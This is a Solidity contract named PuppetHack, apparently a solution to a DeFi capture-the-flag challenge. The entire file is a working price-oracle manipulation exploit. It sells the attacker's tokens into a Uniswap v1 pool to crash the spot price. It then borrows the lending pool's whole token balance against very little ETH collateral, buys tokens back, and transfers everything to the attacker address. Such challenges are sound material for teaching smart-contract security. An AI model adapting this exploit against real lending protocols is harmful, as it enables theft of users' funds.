// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IUniswapv1Exchange.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function borrow(uint256 borrowAmount) external payable;

    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);
}

contract PuppetHack {
    IPool immutable pool;
    IERC20 immutable token;
    UniswapExchangeInterface immutable uniswap;
    address immutable attacker;

    constructor(
        address _pool,
        address _token,
        address _uniswap,
        address _attacker
    ) {
        pool = IPool(_pool);
        token = IERC20(_token);
        uniswap = UniswapExchangeInterface(_uniswap);
        attacker = _attacker;
    }

    function attack() external payable {
        bool transferFromResponse = token.transferFrom(
            attacker,
            address(this),
            token.balanceOf(attacker)
        );
        require(transferFromResponse, "Failed to transferFrom");
        bool approveResponse = token.approve(
            address(uniswap),
            type(uint256).max
        );
        require(approveResponse, "Failed to approve");
        uniswap.tokenToEthSwapInput(
            token.balanceOf(address(this)),
            1,
            block.timestamp + 300 seconds
        );
        uint256 poolTokenBalance = token.balanceOf(address(pool));
        uint256 collateral = pool.calculateDepositRequired(poolTokenBalance);
        pool.borrow{value: collateral}(poolTokenBalance);
        uniswap.ethToTokenSwapInput{value: address(this).balance}(
            1,
            block.timestamp + 300 seconds
        );
        bool transferResponse = token.transfer(
            attacker,
            token.balanceOf(address(this))
        );
        require(transferResponse, "Transfer failed");
    }

    receive() external payable {}
}
